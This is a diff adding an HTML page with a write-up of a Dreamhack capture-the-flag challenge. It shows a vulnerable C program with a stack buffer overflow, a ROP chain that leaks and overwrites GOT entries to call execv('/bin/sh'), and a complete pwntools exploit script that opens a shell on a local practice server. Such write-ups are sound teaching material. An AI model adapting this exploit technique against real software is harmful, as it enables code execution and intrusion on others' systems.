@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+        <p>The problem can be seen <a href="https://dreamhack.io/wargame/challenges/29">here</a>.<br/>
+            The source code of the target program is as below.
+        </p>
+
+        <pre><code>
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;unistd.h&gt;
+
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+
+int main(int argc, char *argv[]) {
+    char buf[0x40] = {};
+
+    initialize();
+
+    read(0, buf, 0x400);
+    write(1, buf, sizeof(buf));
+
+    return 0;
+}
+        </code></pre>
+
+        <p>As we can see, a buffer overflow can occur in main so we can craft an rop chain as follows. </p>
+
+        <pre><code>
+rdi_gadget+p64(0x1)+rsi_gadget+p64(write_got_addr)+p64(0x2)+p64(write_plt) +
+rdi_gadget+p64(0x0)+rsi_gadget+p64(write_got_addr)+p64(0x2)+p64(read_plt) +
+rdi_gadget+p64(0x0)+rsi_gadget+p64(read_got_addr)+p64(0x2)+p64(read_plt) +
+rdi_gadget+p64(read_got_addr)+rsi_gadget+p64(read_got_addr+8)+p64(0x2) + p64(write_plt)
+        </code></pre>
+
+        <p>
+The first line executes <code>write(1, got_addr_of_write, 0x40)</code>, leaking the got entry of <code>write</code> which we use to calculate the 
+got entry of <code>execv</code>
+The second line executes <code>read(0, got_addr_of_write, 0x40)</code>, allowing us to overwrite the got entry of write with the got entry of <code>execv</code>. 
+Subsequent calls to <code>write</code> will thus execute execv instead.
+The third line executes <code>read(0, got_addr_of_read, 0x40)</code>, which lets us overwrite the got entry of read with <code>b"/bin/sh\x00"+p64(read_got_addr)+p64(0x0)</code>.
+Finally, in the last line, since we've used the previous two reads to overwrite the got entry of <code>write</code> to that of <code>execv</code>, essentially rewiring it, and 
+used the got entry of <code>read</code> as a sort of global buffer in which to store the arguments needed for <code>execv</code>, the address to "/bin/sh" will be stored in %rdi, 
+the address to an array that contains the address to "/bin/sh" and NULL will be stored in %rsi, and setting %rip to write@plt will execute <code>execv("/bin/sh", 
+{"/bin/sh", NULL})</code> instead of <code>write("/bin/sh", {"/bin/sh", NULL}, 0x40)</code> since we tampered the got entry of write in line 2.
+        </p>
+        <p>
+            The exploit code is as below.
+        </p>
+
+        <pre><code>
+#!/usr/bin/python3
+from pwn import *
+
+def exploit():
+    #context.log_level="debug"
+    p = remote("localhost", 10001)
+    #p = process("./basic_rop_x64")
+    #input("")
+    libc = ELF("libc.so.6")
+    execv_offset = libc.symbols['execv']
+    write_offset = libc.symbols['write']
+    print("Offset of execv() within libc library: 0x%x" % execv_offset)
+    print("Offset of write() within libc library: 0x%x" % write_offset)
+
+    rop = ROP("./basic_rop_x64")
+    print(rop.rdi)
+    print(rop.rsi)
+    print(rop.ret)
+
+    rdi_gadget = p64(0x400883)
+    rsi_gadget = p64(0x400881)
+    write_plt = 0x4005d0
+    read_plt = 0x4005f0
+    write_got_addr = 0x601020
+    read_got_addr = 0x601030
+
+
+    p.sendline(b"A"*72 +
+               rdi_gadget + p64(0x1) + rsi_gadget + p64(write_got_addr) + p64(0x2) + p64(write_plt) +
+               rdi_gadget + p64(0x0) + rsi_gadget + p64(write_got_addr) + p64(0x2) + p64(read_plt) +
+               rdi_gadget + p64(0x0) + rsi_gadget + p64(read_got_addr) + p64(0x2) + p64(read_plt) +
+               rdi_gadget + p64(read_got_addr) + rsi_gadget + p64(read_got_addr+8) + p64(0x2) + p64(write_plt))
+    
+    print(p.recv(0x40))
+    rec = p.recv(0x40)
+    print(rec)
+    write_got_entry = u64(rec[0:8])
+    execv_got_entry = write_got_entry - write_offset + execv_offset
+    print("{:x}".format(execv_got_entry))
+    sleep(0.1)
+    p.send(p64(execv_got_entry))
+    sleep(0.1)
+    p.send(b"/bin/sh\x00" + p64(read_got_addr) + p64(0x0))
+    p.interactive()
+
+
+if __name__ == "__main__": exploit()
+        </code></pre>
+
+    </main>
+</body>
+</html>
